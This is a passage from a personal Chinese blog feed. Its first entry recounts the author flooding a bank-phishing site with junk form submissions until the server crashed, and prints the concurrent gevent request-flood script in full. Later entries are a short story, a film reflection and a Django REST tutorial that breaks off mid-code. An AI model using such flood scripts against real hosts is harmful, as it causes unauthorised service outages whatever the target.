    <content type="html"><![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
<blockquote>
<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target="_blank" rel="external">wap.abchyd.com</a> 进行领取！【农业银行】</p>
</blockquote>
<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>
<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>
<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>
<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>
<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>
<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>
<p>简单地写了一个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gevent.monkey</span><br><span class="line">gevent.monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> urllib2, urllib</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">()</span>:</span></span><br><span class="line">    id = str(uuid1())[:<span class="number">16</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urllib2.urlopen(<span class="string">'http://www.abchyd.com/add_1.asp'</span>, urllib.urlencode(&#123;</span><br><span class="line">            <span class="string">'logonCardNum'</span>: id,</span><br><span class="line">            <span class="string">'netType'</span>: <span class="string">'111111'</span>,</span><br><span class="line">            <span class="string">'tel'</span>: <span class="string">'12345678900'</span>,</span><br><span class="line">            <span class="string">'randomId'</span>: <span class="string">'1234'</span></span><br><span class="line">        &#125;))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'fucking'</span>, id, <span class="string">'ok'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    gevent.joinall([gevent.spawn(fuck) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>)])</span><br></pre></td></tr></table></figure>
<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>
<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>
<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>
<p>两个小时后。</p>
<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>
<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>
<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>
<p>真正的网络攻防战，远不止如此。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>
<blockquote>
<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com" target=]]>
    </summary>
    
      <category term="安全" scheme="http://hsfzxjy.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[不能说的秘密]]></title>
    <link href="http://hsfzxjy.github.io//secret/"/>
    <id>http://hsfzxjy.github.io//secret/</id>
    <published>2015-06-11T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<p>又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p>
<p>他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p>
<p>他知道，这一切，只是为了那个诺言。</p>
<p>他清楚地记得，在早些时候，他和她许下了一个诺言：这三年，我们就把对方当成空气吧，谁也不认识谁。</p>
<p>很奇怪的约定，不是吗？既然是同班同学，抬头不见低头见，又何出此言。</p>
<p>想到这，他竟有些羞愧起来。</p>
<p>而事实上，在更早些的时候，他们的关系并不是这样的——甚至，还是较要好的朋友。在那个遥远的年代，当女孩还未成为少女，他们还曾一起外出学习，一起嬉闹。他俩的相识源于各自父母的同学关系——他很高兴，她也很高兴，自己有这么一个朋友。</p>
<p>是的，只是朋友，不是别的什么——一个令人向往的时候。</p>
<p>上了初中，尽管进了不同的班级，他还是偶尔会去找她。一切依旧。</p>
<p>但不知为何，一些奇怪的话却在班上渐渐漫开，如同疯长的野草。每一次去找她，他都感觉背后有人在窃窃私语，甚至还有几双异样的目光。诚然，在这个情窦初开的年纪，这样的一种关系是很敏感的。</p>
<p>起初，他很反感这些言论。每一次，他都会极力辩解，甚至和对方吵得面红耳赤。可换来的，却是各种鬼脸，以及更加刻薄的话，就像火上浇油一般。</p>
<p>渐渐地，他学会了沉默。为了避开那些讨厌的话，也不再那么频繁地去找她了。</p>
<p>但，不知为什么，这之后每次想起她，心里却多了一些异样的感觉——这在以前是没有的，一种莫名的、不由自主的激动，一种朦胧的依恋——</p>
<p>就像那流言蜚语所说的，他喜欢上她了。</p>
<p>人，真是奇怪的动物。</p>
<p>他不再对那些传言感到愤怒，甚至，还附和起来，公开表露自己的心声——这时，他清楚：这已不再是传言，而是自己真实的想法。</p>
<p>然而，她却在悄悄地发生变化——不知为何，他每次去找她，她却借故不出来。在路上相遇，也不打招呼，没有微笑，宛如陌生人一般。</p>
<p>他很奇怪，却也没多想，大概是有了新朋友罢——人都会长大的。</p>
<p>直到，那个落雨的夏夜。</p>
<p>那天，正是中考放榜的日子，他得知她和自己考入了同一所重点高中，并进入了同一个重点班，很是兴奋。刚想通过QQ为她庆贺，不料却发觉：自己已被她拉黑了。</p>
<p>想起初中三年的种种变化，他再也忍不住了，立即发短信询问她。得到的，却是她冰冷的回复：</p>
<p>“之前我一直把你当朋友，可你却把我们想成某种关系，还到处宣扬。这让我很受伤。我想，我们还是不要做朋友了……”</p>
<p>“接下来的三年，我真的不知道该如何度过，和你同在一个班，我真的很痛苦。就把我当成空气吧，这样对你我都好……”</p>
<p>他沉默了，回想自己的种种，的确，有些太过分了。但他却不知，这些事，会如此伤她的心。</p>
<p>也好，就让我们彼此当陌生人吧。</p>
<p>夕阳转了个角度，那一片金黄在一点点扩大，但同时也变得更加温柔。</p>
<p>两年了，他们没有说过一句话。</p>
<p>尽管流言蜚语早已不在，他也不愿再与她接触——一切，都是因为那个诺言。</p>
<p>如果不能做朋友，那不伤害对方，也是一种善良。</p>
<p>“之前你们关系不是很好的吗？怎么现在像不认识了一样？”两年来，常有好奇的人问他。</p>
<p>每一次，他都会神秘地笑一笑：</p>
<p>“这是一个不能说的秘密。”</p>
<p>（致：那个被伤害过的她）</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p>
<p>他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p>
<p>他知道，]]>
    </summary>
    
      <category term="不经意间的感动" scheme="http://hsfzxjy.github.io/tags/%E4%B8%8D%E7%BB%8F%E6%84%8F%E9%97%B4%E7%9A%84%E6%84%9F%E5%8A%A8/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[那一年，我们望向星空]]></title>
    <link href="http://hsfzxjy.github.io//that-starry-night/"/>
    <id>http://hsfzxjy.github.io//that-starry-night/</id>
    <published>2015-05-07T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>还记得吗     </p>
<p>那年夏天     </p>
<p>最灿烂、最寂寞的星空</p>
</blockquote>
<a id="more"></a>
<p>其实，比这部电影更出名的，是五月天的那首《星空》，一首我十分熟悉的歌。每当那旋律响起，我总有些淡淡的惆怅：夜空下，尽管繁星璀璨，却无法触及；生活中，尽管万分努力，无奈梦想却悄悄陨落——世上的一切，似乎总要与人作对。然而一曲过后，当那歇斯底里的旋律如晨雾渐渐散去，悔恨、无奈与痛苦，也随之沉淀下来，一切又恢复了平静——就像是伫立于人生的黄昏中，回忆着年少时那数不清的美梦。</p>
<p>而，直到最近我才得知：这只是一首片尾曲，原来还有一部与它同名的电影。</p>
<p>《星空》。</p>
<p>没有浮华的特效，没有肉麻的对白。那一年，一个少年，一位少女，一段耐人寻味的经历。</p>
<p>“我们一起去看星空吧。”</p>
<p>那一晚，在城市的光与影中，在混凝土森林间，小美轻轻地问小杰，没有过多的犹豫。</p>
<p>也许，小美的遭遇是值得同情的：尽管家境殷实，父母却常常争吵不休。每每置身于这偌大的房子里，却都如同处在异域时空，唯有那陈旧的回忆才能给她些许慰藉。相似的经历，让少女认识了小杰——那个在圣诞夜吹笛子的男孩，那个和她一起做教室布置的男孩。</p>
<p>腾空而起的火车，云雾缭绕的阿里山，雨夜的旧教堂，爷爷的小木屋……一场梦幻般的冒险正在进行着。当然，还有那一夜的星空，灿烂得令人终生难忘。</p>
<p>可惜，小美却病倒了，旅途也不得不要结束了。</p>
<p>但生活还得继续。从山里回来，小杰便匆匆地走了，甚至，还没来得及说再见；小美的父母还是离婚了，尽管，小美并不希望。曾经的美好，如松动的拼图般叮当散落下来，露出背后灰色的现实——就像那梦中的场景，残酷，毫不留情。</p>
<p>只是，那片星空，给了她些许慰藉。</p>
<p>随着时光流逝，曾经的不解与难舍，终究还是要散去——而留下的，仅有回忆。这，也是歌曲《星空》所要表达的。</p>
<p>曾几何时，我们每个人心中，都有一片属于自己的星空——在年少时，在我们的上古时代，当我们依旧单纯。</p>
<p>总有一段幻想，让我们流连忘返，就像驰骋于梵高画卷中的铁皮列车；总有一段冒险，让我们刻骨铭心，正如山林间那次凶险的跋涉；而总有一个人，值得我们用一生去回忆。</p>
<p>当残酷的现实还未闯入梦境，当尘世的烦扰还没纠缠于心，那时，那个无法无天的自己，才是真正快乐的。</p>
<p>人，是脆弱的。也许，生活的磨难能使我们变得懦弱，岁月的流逝会让我们失去梦想，世间的一切都和自己过不去。</p>
<p>但，人也可以很坚强。需要的并不多，只是那一片铭记在心的星空。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>还记得吗     </p>
<p>那年夏天     </p>
<p>最灿烂、最寂寞的星空</p>
</blockquote>]]>
    
    </summary>
    
      <category term="不经意间的感动" scheme="http://hsfzxjy.github.io/tags/%E4%B8%8D%E7%BB%8F%E6%84%8F%E9%97%B4%E7%9A%84%E6%84%9F%E5%8A%A8/"/>
    
      <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[【HFMUN重构系列】4. Restful API 框架]]></title>
    <link href="http://hsfzxjy.github.io//hfmun-reconstruction-4/"/>
    <id>http://hsfzxjy.github.io//hfmun-reconstruction-4/</id>
    <published>2015-04-22T16:00:00.000Z</published>
    <updated>2015-11-08T08:40:30.149Z</updated>
    <content type="html"><![CDATA[<h2 id="0x01_什么是REST"><strong>0x01 什么是REST</strong></h2><p>“REST”这个词，也许会在许多场合上出现，但并不是每个人都理解它的意思。在维基百科中，它被定义为：</p>
<blockquote>
<p><strong>Representational State Transfer (REST)</strong> is a software architecture style consisting of guidelines and best practices for creating scalable web services. REST is a coordinated set of constraints applied to the design of components in a distributed hypermedia system that can lead to a more performant and maintainable architecture.    <cite>—— From <a href="http://en.wikipedia.org/wiki/Representational_state_transfer" target="_blank" rel="external">Wikipedia</a></cite></p>
</blockquote>
<p>也就是说：<strong>REST，它不是一种技术，也不是一种标准，而是一种网络资源访问模式，一种编程哲学</strong>。狭义上来说，REST指的是这样的设计思想：</p>
<ol>
<li>每一个 URI 代表一种资源</li>
<li>客户端和服务器之间，传递这种资源的某种表现层</li>
<li>客户端通过五个 HTTP 动词（GET，POST，PUT，PATCH，DELETE），对服务器端资源进行操作，实现”表现层状态转化”（State Transfer）</li>
</ol>
<p>狭义的 REST 范式是基于 B/S 架构，并使用 HTTP 协议进行数据交互。比起古老而笨重的 SOAP 等架构，这种模式更加轻便、直观，使网络资源的访问变得简洁、优雅，也更加符合当今 Web 开发的需求。</p>
<h2 id="0x02_如何正确使用_REST"><strong>0x02 如何正确使用 REST</strong></h2><p>正如上面所说，REST 是基于 HTTP 协议的。它用 URI 来定义资源，并用 HTTP 请求来操作资源。然而，并不是说使用了 HTTP 协议即可称之为 REST——真正意义上的 REST，有自己的一套准则。也正是这套准则，才使得 REST 简洁、优雅。</p>
<h3 id="REST_是语义的">REST 是语义的</h3><p>语义的（Semantic）是指：<strong>资源的 URI 或是资源的访问必须是有意义的，符合或尽量符合自然语言的规范</strong>。</p>
<p>举个例子：如果我要访问订单的列表，那么一个良好的 URI 定义应该是这样的：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/orders/</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>资源的 URI 通常由名词组成，这也正符合自然语言的规范——表达一个物体，人们使用名词。</p>
<p>如果要精确定位某一个资源，通常需要进一步限制资源：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/orders/1/</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>或是：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/orders/current/</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>甚至，可以表示资源的从属关系：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/users/current/orders/1/</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>这就像在和服务器对话一样：<strong>“请给我当前用户的第一份订单”</strong>。</p>
<p>而一些与资源本身无关的信息，比如列表的最大数目，可以放到 URI Params 中：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/orders/?limit=20</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<p>HTTP协议中的动词（Verbs），通常用来描述对资源的操作。每一种动词都有它自己的意义：</p>
<ul>
<li><strong>GET</strong>——获取资源</li>
<li><strong>POST</strong>——建立一个新的资源</li>
<li><strong>PUT</strong>——修改一个资源，必须提交该资源的所有内容</li>
<li><strong>PATCH</strong>——修改一个资源，可以只提交该资源的一部分内容</li>
<li><strong>DELETE</strong>——删除一个资源</li>
</ul>
<h3 id="REST_是多样的">REST 是多样的</h3><p>至于返回的数据，服务器端可以提供多种格式供客户端选择，如 JSON、XML、YAML等等，通常用格式的缩写作为尾缀：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/orders.json/</span> HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<h3 id="REST_是健壮的">REST 是健壮的</h3><p>倘若用户请求的资源不存在或是提交的数据不合规范，服务器必须以<strong>HTTP状态码</strong>的方式通知客户端。常用的状态码有：</p>
<ul>
<li><strong>400</strong> 请求参数有误</li>
<li><strong>401</strong> 用户未登录</li>
<li><strong>403</strong> 没有权限</li>
<li><strong>404</strong> 资源找不到</li>
</ul>
<h2 id="0x03_django_中的_REST"><strong>0x03 django 中的 REST</strong></h2><p>像 REST 这么高大上的东西，早就有人对它进行了实现，这便是：<a href="http://www.django-rest-framework.org/" target="_blank" rel="external">Django Rest Framework</a>。基本的用法可以参见官网。</p>
<p>成熟的框架并不是最好的，只有适合自己的才是。在使用过程中我遇到了一系列的问题，并以自己的方式解决了他们。</p>
<h3 id="ViewSet_的路由不够_D-R-Y-">ViewSet 的路由不够 D.R.Y.</h3><p><code>ViewSet</code> 是 <code>rest_framework</code>中一个十分有创意的地方。它将 CRUD 操作集中到了一个类中，提高了代码的复用性。然而，每一个 <code>ViewSet</code> 都需要 定义一个 <code>Router</code> 进行 URL 路由，这很麻烦。于是乎我便想：</p>
<blockquote>
<p>要是能让它自动感知<code>ViewSet</code>的存在并自动为其定义路由，就像<code>django</code>中的<code>Models</code>一样，那该多好啊</p>
</blockquote>
<p>于是，我仿照<code>django.apps.registry</code>，写了一个能在启东时探知一个 app 中固定内容的 <code>app_cache</code> 模块：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app_cache/core.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.utils.importlib <span class="keyword">import</span> import_module</span><br><span class="line"><span class="keyword">from</span> django.utils.module_loading <span class="keyword">import</span> module_has_submodule</span><br><span class="line"><span class="keyword">from</span> django.apps <span class="keyword">import</span> apps</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppCache</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">'''</span><br><span class="line">    Inherit this class and override the fields below, then import and instantiate</span><br><span class="line">    the subclass at AppConfig.ready method.</span><br><span class="line">    '''</span></span><br><span class="line"></span><br><span class="line">    module_name = <span class="string">''</span></span><br><span class="line">    object_name = <span class="string">''</span></span><br><span class="line">    default_object = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.__module_name = <span class="string">'.%s'</span> % self.module_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_objects</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> mod <span class="keyword">in</span> self.get_modules():</span><br><span class="line">            <span class="keyword">yield</span> getattr(mod, self.object_name, self.default_object)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_modules</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> app_config <span class="keyword">in</span> apps.get_app_configs():</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> module_has_submodule(app_config.module, self.module_name):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">yield</span> import_module(self.__module_name, app_config.name)</span><br></pre></td></tr></table></figure>
<p>同时新建一个叫<code>api</code>的 app，在<code>api/core.py</code>中实现自动寻找<code>ViewSet</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app_cache <span class="keyword">import</span> AppCache</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APICache</span><span class="params">(AppCache)</span>:</span></span><br><span class="line"></span><br><span class="line">    default_object = ()</span><br><span class="line">    object_name = <span class="string">'routers'</span></span><br><span class="line">    module_name = <span class="string">'routers'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_routers</span><span class="params">(self)</span>:</span></span><br><span class="line">        results = []</span><br><span class="line">        <span class="keyword">for</span> obj <span class="keyword">in</span> self.get_objects():</span><br><span class="line">            results.extend(obj)</span><br><span class="line">        <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line">cache = APICache()</span><br></pre></td></tr></table></figure>
<p>在<code>api/urls.py</code>中实现自动路由：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># api/urls.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, patterns, include</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> DefaultRouter</span><br><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> ViewSetMixin</span><br><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .core <span class="keyword">import</span> cache</span><br><span class="line"></span><br><span class="line">extra_list = []</span><br><span class="line">router = DefaultRouter()</span><br><span class="line"><span class="keyword">for</span> pattern, obj <span class="keyword">in</span> cache.get_routers():</span><br><span class="line">    <span class="keyword">if</span> callable(obj) <span class="keyword">and</span> <span class="keyword">not</span> isinstance(obj, type) <span class="keyword">or</span> isinstance(obj, basestring):</span><br><span class="line">        extra_list.append(url(pattern, obj))</span><br><span class="line">    <span class="keyword">elif</span> issubclass(obj, ViewSetMixin):</span><br><span class="line">        router.register(pattern, obj)</span><br><span class="line">    <span class="keyword">elif</span> issubclass(obj, APIView):</span><br><span class="line">        extra_list.append(url(pattern, obj.as_view()))</span><br><span class="line"></span><br><span class="line">extra_list.append(url(<span class="string">r'^'</span>, include(router.urls)))</span><br><span class="line"></span><br><span class="line">urlpatterns = patterns(<span class="string">''</span>,</span><br><span class="line">    url(<span class="string">r'^auth/'</span>, include(<span class="string">'rest_framework.urls'</span>, namespace = <span class="string">'rest_framework'</span>)),</span><br><span class="line">    url(<span class="string">r'^root/$'</span>, <span class="string">'api.views.root'</span>,),</span><br><span class="line">    *extra_list</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>之后，只需在每个 app 中定义一个<code>routers.py</code>，并定义<code>routers</code>变量即可实现 <code>ViewSet</code> 的自动路由，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> UserAPIViewSet</span><br><span class="line"></span><br><span class="line">routers = (</span><br><span class="line">    (<span class="string">r'users'</span>, UserAPIViewSet),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>非常方便。</p>
<h3 id="分页机制的进一步改进">分页机制的进一步改进</h3><p><code>rest_framework</code>提供了一个数据分页的机制：透过<code>limit</code>和<code>page</code>这两个 URL 参数可以实现数据的分页以及页码索引。</p>
<p>但这个功能在客户要求的应用场景中似乎并不太实用。毕竟，模联大会是一次节奏紧张的活动，网站并发量大，内容更新频繁，若应用传统分页的构想，可能会出现翻页时浏览到重复内容的情况。除此之外，这样的架构不利于实现<strong>瀑布流式</strong>的界面，因为瀑布流式要求待加载的数据与已加载的数据完美地无缝接合，而这一点对于传统分页架构来说也是力不从心。</p>
<p>曾记得，<a href="http://open.weibo.com/wiki/2/statuses/public_timeline" target="_blank" rel="external">新浪微博 API </a>中好像有类似的实现：凡是返回一个列表的 API ，返回数据中都会有<code>previous_cursor</code>和<code>next_cursor</code>两个参数，通过这两个参数，开发者可以获取上一份或下一份的数据。受此启发，我决定增强一下<code>rest_framework</code>的分页机制。</p>
<blockquote>
<p>####想法</p>
<ol>
<li>可在 API 的请求中传入参数 <code>sinceid</code> 或是 <code>beforeid</code>，表示获取<code>id</code>紧跟着<code>&lt;sinceid&gt;</code>或是<code>&lt;beforeid&gt;</code>的一批数据。</li>
<li>当 API 返回值是一个列表时，返回数据中增加两个域<code>since</code>和<code>before</code>，分别是指向上一批数据及下一批数据的 URL。</li>
</ol>
</blockquote>
<p>改动得不多，于是我便直接在别人的代码里开刀了。</p>
<p>首先在<code>rest_framework/</code>中增加一个<code>custom_filters.py</code>，用于存放自定义的过滤器：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django_filters <span class="keyword">import</span> FilterSet, NumberFilter</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">'get_timeline_filter'</span>, <span class="string">'is_timeline_filter'</span>]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimelineFilter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_timeline_filter</span><span class="params">(obj)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> issubclass(obj.__class__, TimelineFilter)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_timeline_filter</span><span class="params">(model_class, base_filter_class = FilterSet)</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">    工厂方法，给不同的模型类指派不同的过滤器</span><br><span class="line">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> base_filter_class:</span><br><span class="line">        base_filter_class = FilterSet</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_TimelineFilter</span><span class="params">(base_filter_class, TimelineFilter)</span>:</span></span><br><span class="line"></span><br><span class="line">        sinceid = NumberFilter(name = <span class="string">'pk'</span>, lookup_type = <span class="string">'gt'</span>)</span><br><span class="line">        beforeid = NumberFilter(name = <span class="string">'pk'</span>, lookup_type = <span class="string">'lt'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Meta</span><span class="params">(getattr<span class="params">(base_filter_class,<span 